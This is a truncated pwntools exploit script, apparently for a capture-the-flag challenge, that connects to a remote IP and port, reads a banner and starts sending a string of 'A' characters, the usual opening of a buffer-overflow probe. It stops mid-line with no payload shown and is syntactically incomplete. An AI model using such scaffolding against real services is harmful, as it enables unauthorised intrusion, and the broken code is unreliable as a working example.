from pwn import *

r = remote("104.154.106.182",5678)
r.recv(1024)
r.sendline("A"
